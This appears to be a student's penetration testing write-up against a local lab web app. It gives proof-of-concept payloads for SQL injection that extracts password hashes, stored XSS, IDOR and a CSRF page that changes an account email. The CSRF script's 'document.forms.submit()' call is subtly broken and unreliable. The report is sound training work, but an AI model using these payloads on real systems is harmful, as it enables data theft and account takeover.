# Identified Vulnerabilities & Proof-of-Concept (PoC) Exploits

**Task:** Week 6 - Task 2 (Web Application Penetration Testing)  

---

## PT-01: Union-Based SQL Injection (Critical)
* **Endpoint:** `GET /api/products?id=1`
* **Description:** The `id` parameter is passed directly into a backend SQL query without sanitization, allowing attackers to extract database tables.
* **Proof of Concept (PoC):**
  1. Intercepted `GET /api/products?id=1` in **Burp Suite Repeater**.
  2. Tested single quote `'` which triggered a `500 Internal Server Error (SQL syntax error)`.
  3. Determined column count (`3` columns) and injected the following payload:
     ```http
     GET /api/products?id=-1 UNION SELECT 1,username,password FROM users-- HTTP/1.1
     Host: localhost:3000
     ```
  4. **Result:** The application response returned administrative usernames and password hashes directly in the product details field.

---

## PT-02: Stored Cross-Site Scripting (High)
* **Endpoint:** `POST /api/reviews/submit`
* **Description:** The product review comment field stores raw HTML/JavaScript in the database and executes it whenever any user views the product page.
* **Proof of Concept (PoC):**
  1. Submitted a review containing the payload:
     ```html
     Great product! <img src=x onerror="alert('Stored_XSS_PoC')">
     ```
  2. Reloaded the product page in the browser.
  3. **Result:** The JavaScript alert triggered automatically for every visitor viewing that page.

---

## PT-03: Insecure Direct Object Reference / IDOR (High)
* **Endpoint:** `GET /api/users/profile?uid=102`
* **Description:** The API fetches user profile details solely based on the numeric `uid` parameter without verifying session ownership.
* **Proof of Concept (PoC):**
  1. Logged in as a standard user (`uid=102`) and captured the profile request in Burp Suite.
  2. Modified `uid=102` to `uid=101` (Admin user) and forwarded the request.
  3. **Result:** Received HTTP `200 OK` along with the administrator's private email, phone number, and address.

---

## PT-04: Cross-Site Request Forgery / CSRF (Medium)
* **Endpoint:** `POST /account/update-email`
* **Description:** The email update endpoint lacks CSRF token validation and accepts cross-origin form submissions.
* **Proof of Concept (PoC):**
  1. Created a malicious HTML page hosted externally:
     ```html
     <html>
       <body>
         <form action="http://localhost:3000/account/update-email" method="POST">
           <input type="hidden" name="email" value="attacker@evil.com" />
         </form>
         <script>document.forms.submit();</script>
       </body>
     </html>
     ```
  2. **Result:** Opening this page while authenticated silently changed the victim's account email address.
